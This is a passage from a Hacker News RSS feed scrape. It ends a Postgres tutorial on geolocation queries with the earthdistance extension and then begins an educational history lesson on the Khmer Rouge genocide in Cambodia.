);</pre>



<h2>Installing Postgres extensions</h2>



<p>We would like to be able to stand in St. James park (a large park between 10 Downing Street and Buckingham Palace) and see the two posts close by, but not the one from Cambridge.</p>



<p>So how do we do that? Through extensions! Postgres enables users to incrementally add features that help us do new things with our data.</p>



<p>Once they are installed we can use the latitude and longitude of <em>51.5032, -0.1349</em> to create a new select query on our posts table.</p>



<div data-amp-noloading="true" data-amp-lightbox="true"><figure><img data-attachment-id="217" data-permalink="https://adamfallon.com/screenshot-2020-07-10-at-09-55-52/" data-orig-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.55.52.png?fit=2560%2C1382&amp;ssl=1" data-orig-size="2560,1382" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="screenshot-2020-07-10-at-09.55.52" data-image-description="" data-medium-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.55.52.png?fit=300%2C162&amp;ssl=1" data-large-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.55.52.png?fit=580%2C313&amp;ssl=1" src="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.55.52.png?w=580&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-09.55.52.png?w=580&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<p>You can install extensions in Postgres simply by running a query. The two extensions we need are <strong><em>cube</em></strong> and <strong><em>earthdistance</em></strong>.</p>



<pre>CREATE EXTENSION IF NOT EXISTS cube;
CREATE EXTENSION IF NOT EXISTS earthdistance;</pre>



<p>After executing those two queries, you should see them under the ‘Extensions’ tab in DBeaver.</p>



<div><figure><img data-attachment-id="219" data-permalink="https://adamfallon.com/screenshot-2020-07-10-at-10-24-18/" data-orig-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-10.24.18.png?fit=652%2C190&amp;ssl=1" data-orig-size="652,190" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="screenshot-2020-07-10-at-10.24.18" data-image-description="" data-medium-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-10.24.18.png?fit=300%2C87&amp;ssl=1" data-large-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-10.24.18.png?fit=580%2C169&amp;ssl=1" src="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-10.24.18.png?w=580&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-10.24.18.png?w=580&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<h2>Finding nearby posts.</h2>



<p>We can now use these built in functions from those extensions to show us the two nearby posts.</p>



<pre>SELECT * FROM post
WHERE 
	earth_box(ll_to_earth(51.5032,-0.1349), 50000) 
	@&gt; ll_to_earth(latitude, longitude);</pre>



<p>The earth_box function takes two parameters, a point (which is returned by the ll_to_earth function) and a value for the size of the bounding box we want which is in metres. </p>



<p>By using the <a aria-label="undefined (opens in a new tab)" href="https://www.postgresql.org/docs/current/functions-geometry.html" target="_blank" rel="noreferrer noopener nofollow">contains?</a> operator (@&gt;) we are saying we only want values in the table in the bounding box generated by the earth_box function.</p>



<p>When executing that query we will see the two posts we were expecting! Try increasing the bounding box range out and you will be able to see the Cambridge post.</p>



<div><figure><img data-attachment-id="223" data-permalink="https://adamfallon.com/screenshot-2020-07-10-at-10-30-11/" data-orig-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-10.30.11.png?fit=2558%2C1516&amp;ssl=1" data-orig-size="2558,1516" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="screenshot-2020-07-10-at-10.30.11" data-image-description="" data-medium-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-10.30.11.png?fit=300%2C178&amp;ssl=1" data-large-file="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-10.30.11.png?fit=580%2C344&amp;ssl=1" src="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-10.30.11.png?w=580&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/adamfallon.com/wp-content/uploads/2020/07/screenshot-2020-07-10-at-10.30.11.png?w=580&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure></div>



<p>So now we have a working example of how to recreate the YikYak location-based functionality.</p>



<h2>So…how?</h2>



<p>Okay so why did we need those extensions? Can’t we just take the world, split it into squares and determine which box a latitude and longitude falls into? </p>



<p>Thats what we would <em>like</em> to do – but there are complications caused by the fact that the world is a sphere. To find posts “in your area” you are querying to find straight line distances between two points, your lat-long and for each row in the database. In a sphere there are no straight lines. </p>



<p>There is a way to determine the distance between two points known as the <a aria-label="undefined (opens in a new tab)" href="https://en.wikipedia.org/wiki/Great-circle_distance#:~:text=The%20great%2Dcircle%20distance%20or,line%20through%20the%20sphere's%20interior)." target="_blank" rel="noreferrer noopener nofollow">Great-Circle distance</a>. Instead of using straight lines we use circles or curves known as geodesics. Through any two points on a sphere that are not&nbsp;<a href="https://en.wikipedia.org/wiki/Antipodal_point">directly opposite each other</a>, there is a unique great circle. </p>



<p>The earthdistance extension allows us to generate queries using the contains? operator from the cube extension to generate efficient distance lookups between points.</p>



<h2>Conclusion</h2>



<p>One thing to note is that this query will do a sequential scan of the entire table, which can be slow once you get up to thousands of posts. </p>



<p>If you do decide to use this setup in your application you should create an index on the latitude, longitude to dramatically speed up queries. That would look like this.</p>



<pre>CREATE INDEX loc_index ON post USING gist (ll_to_earth(latitude, longitude));</pre>



<p>Postgres will then determine whether it needs to use this index to speed up queries. You can check if the index is being used by using a tool to view the execution plan when you run the query detailed above. If it says SEQ_SCAN it is not using the index. </p>



<p>And we’re done! If you’ve noticed any mistakes or improvements I can make please drop me an email at adam@adamfallon.com</p>

		</div><!-- .entry-content -->

	</div></div>]]>
            </description>
            <link>https://adamfallon.com/2020/07/10/recreating-yikyak-with-postgres/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23837269</guid>
            <pubDate>Tue, 14 Jul 2020 20:18:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Khmer Rouge: Genocide in the Name of Utopia (2016)]]>
            </title>
            <description>
<![CDATA[
Score 180 | Comments 176 (<a href="https://news.ycombinator.com/item?id=23836985">thread link</a>) | @exolymph
<br/>
July 14, 2020 | https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/ | <a href="https://web.archive.org/web/*/https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<h5><strong>How is history used to support ideology? Is violence by a government against its own civilian population ever justified? Why are certain events given priority over others in history books?</strong></h5>
<h5><strong>This lesson was reported from:</strong></h5>

<h6>Adapted in part from open sources.</h6>

<figure data-shortcode="caption" id="attachment_464" aria-describedby="caption-attachment-464"><a href="https://openendedsocialstudies.files.wordpress.com/2016/06/skulls_2584193k.jpg"><img data-attachment-id="464" data-permalink="https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/skulls_2584193k/" data-orig-file="https://openendedsocialstudies.files.wordpress.com/2016/06/skulls_2584193k.jpg" data-orig-size="858,536" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Evidence for genocide in Cambodia." data-image-description="" data-medium-file="https://openendedsocialstudies.files.wordpress.com/2016/06/skulls_2584193k.jpg?w=300" data-large-file="https://openendedsocialstudies.files.wordpress.com/2016/06/skulls_2584193k.jpg?w=820" src="https://openendedsocialstudies.files.wordpress.com/2016/06/skulls_2584193k.jpg?w=581&amp;h=362" alt="Evidence for genocide in Cambodia." width="581" height="362" srcset="https://openendedsocialstudies.files.wordpress.com/2016/06/skulls_2584193k.jpg?w=579&amp;h=362 579w, https://openendedsocialstudies.files.wordpress.com/2016/06/skulls_2584193k.jpg?w=150&amp;h=94 150w, https://openendedsocialstudies.files.wordpress.com/2016/06/skulls_2584193k.jpg?w=300&amp;h=187 300w, https://openendedsocialstudies.files.wordpress.com/2016/06/skulls_2584193k.jpg?w=768&amp;h=480 768w, https://openendedsocialstudies.files.wordpress.com/2016/06/skulls_2584193k.jpg 858w" sizes="(max-width: 581px) 100vw, 581px"></a><figcaption id="caption-attachment-464">Evidence for genocide in Cambodia.</figcaption></figure>
<p><!--block-->The Khmer Rouge was formed in 1968 as a revolutionary Communist party in Cambodia. It was the <a href="https://en.wikipedia.org/wiki/Ruling_party">ruling party</a> in Cambodia from 1975 to 1979, led by <a href="https://en.wikipedia.org/wiki/Pol_Pot">Pol Pot</a>. <a href="https://en.wikipedia.org/wiki/Democratic_Kampuchea">Democratic Kampuchea</a> was the name of the state as controlled by the government of the Khmer Rouge from 1975 to 1979.</p>
<p><!--block-->The four-year period cost approximately 2 million lives through the combined result of political executions, disease, <a href="https://en.wikipedia.org/wiki/Starvation">starvation</a>, and <a href="https://en.wikipedia.org/wiki/Unfree_labor">forced labor</a>. Due to the large numbers, the deaths during the rule of the Khmer Rouge are commonly known as the Cambodian Holocaust or <a href="https://en.wikipedia.org/wiki/Cambodian_genocide">Cambodian genocide</a>. The Khmer Rouge took power at the end of the <a href="https://en.wikipedia.org/wiki/Cambodian_Civil_War">Cambodian Civil War</a> and were only toppled after the invasion of Cambodia by the neighboring Socialist Republic of <a href="https://en.wikipedia.org/wiki/Vietnam">Vietnam</a> in the <a href="https://en.wikipedia.org/wiki/Cambodian%E2%80%93Vietnamese_War">Cambodian–Vietnamese War</a>.</p>
<h2>Pol Pot and the Revolution</h2>

<p><!--block-->Saloth Sar was born on 19 May 1925, the eighth of nine children and the second of three sons to Pen Saloth and Sok Nem. The family was living in the small fishing village of <a href="https://en.wikipedia.org/wiki/Prek_Sbauv">Prek Sbauv</a>, <a href="https://en.wikipedia.org/wiki/Kampong_Thom_Province">Kampong Thom Province</a> when Cambodia was still a French colony. Pen Saloth was a rice farmer who owned 12 <a href="https://en.wikipedia.org/wiki/Hectare">hectares</a> of land and several buffaloes; the family was considered moderately wealthy by the standards of the day. Although Pen Saloth’s family was of <a href="https://en.wikipedia.org/wiki/Chinese_Cambodian">Sino</a>–<a href="https://en.wikipedia.org/wiki/Khmer_people">Khmer</a> descent and Saloth Sar was named accordingly due to his fair complexion (“Sar” means white in Khmer), the family had already assimilated themselves with mainstream Khmer society by the time Sar was born.</p>
<p><!--block-->In 1935, Saloth Sar left Prek Sbauv to attend the École Miche, a Catholic school in <a href="https://en.wikipedia.org/wiki/Phnom_Penh">Phnom Penh</a>. He lived with his cousin, a woman called Meak, a member of the <a href="https://en.wikipedia.org/wiki/Royal_Ballet_of_Cambodia">Royal Ballet</a>.In 1926, she bore King <a href="https://en.wikipedia.org/wiki/Sisowath_Monivong">Monivong’s</a> son, HRH Prince Sisowath Kusarak. She was given the official title <em>Khun Preah Moneang Bopha Norleak Meak</em>. Saloth Sar stayed with Meak’s household until 1942. His sister Roeung was a <a href="https://en.wikipedia.org/wiki/Concubinage">concubine</a> of King Monivong, so through the two women, he often had cause to visit the <a href="https://en.wikipedia.org/wiki/Royal_Palace,_Phnom_Penh">royal palace</a>.&nbsp; In 1947, he gained admission to the exclusive <a href="https://en.wikipedia.org/wiki/Lyc%C3%A9e_Sisowath">Lycée Sisowath</a>, but was unsuccessful in his studies.</p>
<p><!--block-->As a student in Phnom Penh and later in Paris, Saloth was exposed to anti-colonial, revolutionary, and socialist ideas.&nbsp; He became increasingly radical, outraged by French colonialism, the poverty of his nation compared to France itself, and wealth inequality within Cambodia even after French granted the nation independence in the 1950s.</p>
<p><!--block-->Saloth was a founding member of the Khmer Rouge, a party dedicated to socialist revolution in Cambodia.</p>
<div>
<h2>Ideology</h2>
<figure data-shortcode="caption" id="attachment_470" aria-describedby="caption-attachment-470"><a href="https://openendedsocialstudies.files.wordpress.com/2016/06/9660abf16bdbccfcaa829a72aa444922.jpg"><img data-attachment-id="470" data-permalink="https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/9660abf16bdbccfcaa829a72aa444922/" data-orig-file="https://openendedsocialstudies.files.wordpress.com/2016/06/9660abf16bdbccfcaa829a72aa444922.jpg" data-orig-size="634,692" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="A female Khmer Rouge fighter or ‘mit naree’ carries an AK-47 assault rifle, a weapon of Communist revolution the world over." data-image-description="" data-medium-file="https://openendedsocialstudies.files.wordpress.com/2016/06/9660abf16bdbccfcaa829a72aa444922.jpg?w=275" data-large-file="https://openendedsocialstudies.files.wordpress.com/2016/06/9660abf16bdbccfcaa829a72aa444922.jpg?w=634" src="https://openendedsocialstudies.files.wordpress.com/2016/06/9660abf16bdbccfcaa829a72aa444922.jpg?w=275&amp;h=300" alt="A female Khmer Rouge fighter or 'mit naree' carries an AK-47 assault rifle, a weapon of Communist revolution the world over." width="275" height="300" srcset="https://openendedsocialstudies.files.wordpress.com/2016/06/9660abf16bdbccfcaa829a72aa444922.jpg?w=275&amp;h=300 275w, https://openendedsocialstudies.files.wordpress.com/2016/06/9660abf16bdbccfcaa829a72aa444922.jpg?w=550&amp;h=600 550w, https://openendedsocialstudies.files.wordpress.com/2016/06/9660abf16bdbccfcaa829a72aa444922.jpg?w=137&amp;h=150 137w" sizes="(max-width: 275px) 100vw, 275px"></a><figcaption id="caption-attachment-470">A female Khmer Rouge fighter or ‘mit naree’ carries an AK-47 assault rifle, a weapon of Communist revolution the world over.</figcaption></figure>
<p>The Khmer Rouge’s ideology combined elements of&nbsp;<a href="https://en.wikipedia.org/wiki/Marxism">Marxism</a>&nbsp;with an extreme version of Khmer nationalism and&nbsp;<a href="https://en.wikipedia.org/wiki/Xenophobia">xenophobia</a>. It combined an idealization of the&nbsp;<a href="https://en.wikipedia.org/wiki/Angkor_Empire">Angkor Empire</a>&nbsp;(802–1431), with an existential fear for the existence of the Cambodian state, which had historically been liquidated under Vietnamese and Siamese intervention.The spillover of Vietnamese fighters from the&nbsp;<a href="https://en.wikipedia.org/wiki/Vietnam_War">Vietnam War</a>&nbsp;further aggravated anti-Vietnamese feeling. The Khmer Rouge explicitly targeted the Chinese, Vietnamese, and even their partially Khmer offspring for extinction; although the&nbsp;<a href="https://en.wikipedia.org/wiki/Cham_people">Cham Muslims</a>&nbsp;were treated unfavorably, they were encouraged to “mix flesh and blood”, to intermarry and assimilate. Some people with partial Chinese or Vietnamese ancestry were present in the Khmer Rouge leadership; they either were purged or participated in the&nbsp;<a href="https://en.wikipedia.org/wiki/Ethnic_cleansing">ethnic cleansing</a>&nbsp;campaigns.</p>
<p>The Khmer Rouge’s social policy focused on working towards a purely agrarian society. Pol Pot strongly influenced the propagation of this policy. He was reportedly impressed with how the mountain tribes of Cambodia lived, which the party interpreted as a form of&nbsp;<a href="https://en.wikipedia.org/wiki/Primitive_communism">primitive communism</a>; as a result, those minorities received more lenient and sometimes even more favorable treatment than the urbanized “<a href="https://en.wikipedia.org/wiki/Bourgeois">bourgeois</a>” Chinese and Vietnamese. Pol Pot wanted to remove social institutions and to transform the society into an agrarian one. This was his way of “[creating] a complete Communist society without wasting time on the intermediate steps” as the Khmer Rouge said to&nbsp;<a href="https://en.wikipedia.org/wiki/China">China</a>&nbsp;in 1975.</p>
<h2>Control of the countryside</h2>
<p>The Khmer Rouge advanced during 1973. After they reached the outskirts of Phnom Penh, Sar issued orders during the peak of the <a href="https://en.wikipedia.org/wiki/Wet_season">rainy season</a> that the city be taken. The orders led to futile attacks and wasted lives within the Khmer Rouge army. By the middle of 1973, the Khmer Rouge under Sar controlled almost two-thirds of the country and half the population.</p>
<p>Internationally, Sar and the Khmer Rouge gained the recognition of 63 countries as the true government of Cambodia. A move was made at the UN to give the seat for Cambodia to the Khmer Rouge; they prevailed by three votes.</p>
<div>
<p>The Khmer Rouge took the capital <a href="https://en.wikipedia.org/wiki/Phnom_Penh">Phnom Penh</a> on 17 April 1975, proclaiming this be Year Zero – all culture and traditions within society would be completely destroyed or discarded, and a new revolutionary culture would replace it.</p>
<figure data-shortcode="caption" id="attachment_473" aria-describedby="caption-attachment-473"><a href="https://openendedsocialstudies.files.wordpress.com/2016/06/d158d8646827595a49fa281c27071779.jpg"><img data-attachment-id="473" data-permalink="https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/d158d8646827595a49fa281c27071779/" data-orig-file="https://openendedsocialstudies.files.wordpress.com/2016/06/d158d8646827595a49fa281c27071779.jpg" data-orig-size="611,404" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Phnom Penh, January 1st, 1975 in the waning days of the civil war." data-image-description="" data-medium-file="https://openendedsocialstudies.files.wordpress.com/2016/06/d158d8646827595a49fa281c27071779.jpg?w=300" data-large-file="https://openendedsocialstudies.files.wordpress.com/2016/06/d158d8646827595a49fa281c27071779.jpg?w=611" src="https://openendedsocialstudies.files.wordpress.com/2016/06/d158d8646827595a49fa281c27071779.jpg?w=580&amp;h=383" alt="Phnom Penh, January 1st, 1975 in the waning days of the civil war." width="580" height="383" srcset="https://openendedsocialstudies.files.wordpress.com/2016/06/d158d8646827595a49fa281c27071779.jpg?w=580&amp;h=383 580w, https://openendedsocialstudies.files.wordpress.com/2016/06/d158d8646827595a49fa281c27071779.jpg?w=150&amp;h=99 150w, https://openendedsocialstudies.files.wordpress.com/2016/06/d158d8646827595a49fa281c27071779.jpg?w=300&amp;h=198 300w, https://openendedsocialstudies.files.wordpress.com/2016/06/d158d8646827595a49fa281c27071779.jpg 611w" sizes="(max-width: 580px) 100vw, 580px"></a><figcaption id="caption-attachment-473">Phnom Penh, January 1st, 1975 in the waning days of the civil war.</figcaption></figure>
<h2>Societal transformation</h2>
<p>After taking power, the Khmer Rouge leadership renamed the country Democratic Kampuchea. The Khmer Rouge subjected Cambodia to a radical social reform process that was aimed at creating a purely&nbsp;<a href="https://en.wikipedia.org/wiki/Agrarian_socialism">agrarian-based Communist society</a>.&nbsp;The Khmer Rouge forced around three million people from the cities to the countryside to take up work in agriculture. They forced many people out of their homes and ignored many basic human freedoms; they controlled how Cambodians acted, what they wore, to whom they could talk, and many other aspects of their lives.</p>
<dl id="attachment_472">
<dt><a href="https://openendedsocialstudies.files.wordpress.com/2016/06/90631961305feae1ac126f4e2ae87bc7.png"><img data-attachment-id="472" data-permalink="https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/90631961305feae1ac126f4e2ae87bc7/" data-orig-file="https://openendedsocialstudies.files.wordpress.com/2016/06/90631961305feae1ac126f4e2ae87bc7.png" data-orig-size="1204,1007" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="The evacuation of Cambodia’s urban areas occurred on the pretext of a U.S. invasion that never came." data-image-description="" data-medium-file="https://openendedsocialstudies.files.wordpress.com/2016/06/90631961305feae1ac126f4e2ae87bc7.png?w=300" data-large-file="https://openendedsocialstudies.files.wordpress.com/2016/06/90631961305feae1ac126f4e2ae87bc7.png?w=820" src="https://openendedsocialstudies.files.wordpress.com/2016/06/90631961305feae1ac126f4e2ae87bc7.png?w=300&amp;h=251" alt="The evacuation of Cambodia's urban areas occurred on the pretext of a U.S. invasion that never came." width="300" height="251" srcset="https://openendedsocialstudies.files.wordpress.com/2016/06/90631961305feae1ac126f4e2ae87bc7.png?w=300&amp;h=251 300w, https://openendedsocialstudies.files.wordpress.com/2016/06/90631961305feae1ac126f4e2ae87bc7.png?w=600&amp;h=502 600w, https://openendedsocialstudies.files.wordpress.com/2016/06/90631961305feae1ac126f4e2ae87bc7.png?w=150&amp;h=125 150w" sizes="(max-width: 300px) 100vw, 300px"></a></dt>
<dd>The evacuation of Cambodia’s urban areas occurred on the pretext of a U.S. invasion that never came.</dd>
</dl>
<p>The Khmer Rouge believed that parents were tainted with&nbsp;<a href="https://en.wikipedia.org/wiki/Capitalism">capitalism</a>, so they separated children from their parents, indoctrinated them in&nbsp;<a href="https://en.wikipedia.org/wiki/Communism">communism</a>, and taught them torture methods with animals. Children were a “dictatorial instrument of the party” and were given leadership in torture and executions.</p>
<p>Society was divided into two categories. These were the New People – intellectuals, city-dwellers, minority people, and many of their own party members and soldiers who were suspected of being traitors – and the Old People – those who already lived in the countryside.</p>
<p>The lowest unit of social control, the&nbsp;<em>krom</em>&nbsp;(group), consisted of ten to fifteen nuclear families whose activities were closely supervised by a three-person committee. The committee chairman was selected by the CPK. This grass roots leadership was required to note the social origin of each family under its jurisdiction and to report it to persons higher up in the&nbsp;party hierarchy.</p>
<h2>The New People</h2>
<div>
<figure data-shortcode="caption" id="attachment_475" aria-describedby="caption-attachment-475"><a href="https://openendedsocialstudies.files.wordpress.com/2016/06/khmer_rouge_07.jpg"><img data-attachment-id="475" data-permalink="https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/khmer_rouge_07/" data-orig-file="https://openendedsocialstudies.files.wordpress.com/2016/06/khmer_rouge_07.jpg" data-orig-size="611,404" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Forced labor camp in Kampong Cham, Cambodia." data-image-description="" data-medium-file="https://openendedsocialstudies.files.wordpress.com/2016/06/khmer_rouge_07.jpg?w=300" data-large-file="https://openendedsocialstudies.files.wordpress.com/2016/06/khmer_rouge_07.jpg?w=611" src="https://openendedsocialstudies.files.wordpress.com/2016/06/khmer_rouge_07.jpg?w=368&amp;h=243" alt="Forced labor camp in Kampong Cham, Cambodia." width="368" height="243" srcset="https://openendedsocialstudies.files.wordpress.com/2016/06/khmer_rouge_07.jpg?w=368&amp;h=243 368w, https://openendedsocialstudies.files.wordpress.com/2016/06/khmer_rouge_07.jpg?w=150&amp;h=99 150w, https://openendedsocialstudies.files.wordpress.com/2016/06/khmer_rouge_07.jpg?w=300&amp;h=198 300w, https://openendedsocialstudies.files.wordpress.com/2016/06/khmer_rouge_07.jpg 611w" sizes="(max-width: 368px) 100vw, 368px"></a><figcaption id="caption-attachment-475">Forced labor camp in Kampong Cham, Cambodia.</figcaption></figure>
<p>New People were treated as forced laborers. They were constantly moved, were forced to do the hardest physical labor, and worked in the most inhospitable, fever-ridden parts of the country, such as forests, upland areas, and swamps. “New People were segregated from Old People, enjoyed little or no privacy, and received the smallest rice rations. When the country experienced <a href="https://en.wikipedia.org/wiki/Famine">food shortages</a> in 1977, the New People suffered the most.</p>
</div>
<p>The medical care available to them was primitive or nonexistent. Families often were separated because people were divided into work brigades according to age and sex and sent to different parts of the country. New People were subjected to unending political indoctrination and could be executed without trial.</p>
<p>One of their mottos in reference to the <a href="https://en.wikipedia.org/wiki/New_People">New People</a> was: “To keep you is no benefit. To destroy you is no loss.”</p>
<p>The situation of the Old People under Khmer Rouge rule was more ambiguous. Refugee interviews reveal cases in which villagers were treated as harshly as the New People, enduring forced labor, indoctrination, the separation of children from parents, and executions; however, they were generally allowed to remain in their native villages.</p>
</div>
</div>
<h2>Life Under the Khmer Rouge</h2>
<div>
<p>Once in power, the Khmer Rouge carried out a radical program that included isolating the country from all foreign influences, closing schools, hospitals, and factories, abolishing banking, finance, and currency, outlawing all religions, confiscating all <a href="https://en.wikipedia.org/wiki/Private_property">private property</a> and relocating people from urban areas to <a href="https://en.wikipedia.org/wiki/Collective_farm">collective farms</a> where forced labor was widespread. The purpose of this policy was to turn all Cambodians into Old People through agricultural labor.</p>
<figure data-shortcode="caption" id="attachment_466" aria-describedby="caption-attachment-466"><a href="https://openendedsocialstudies.files.wordpress.com/2016/06/8e1cd4dbed4fa55ac88aba90e53ea0e8.jpg"><img data-attachment-id="466" data-permalink="https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/8e1cd4dbed4fa55ac88aba90e53ea0e8/" data-orig-file="https://openendedsocialstudies.files.wordpress.com/2016/06/8e1cd4dbed4fa55ac88aba90e53ea0e8.jpg" data-orig-size="826,779" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="The evactuation of Phnom Penh, 1975." data-image-description="" data-medium-file="https://openendedsocialstudies.files.wordpress.com/2016/06/8e1cd4dbed4fa55ac88aba90e53ea0e8.jpg?w=300" data-large-file="https://openendedsocialstudies.files.wordpress.com/2016/06/8e1cd4dbed4fa55ac88aba90e53ea0e8.jpg?w=820" src="https://openendedsocialstudies.files.wordpress.com/2016/06/8e1cd4dbed4fa55ac88aba90e53ea0e8.jpg?w=300&amp;h=283" alt="The evacuation of Phnom Penh, 1975." width="300" height="283" srcset="https://openendedsocialstudies.files.wordpress.com/2016/06/8e1cd4dbed4fa55ac88aba90e53ea0e8.jpg?w=300&amp;h=283 300w, https://openendedsocialstudies.files.wordpress.com/2016/06/8e1cd4dbed4fa55ac88aba90e53ea0e8.jpg?w=600&amp;h=566 600w, 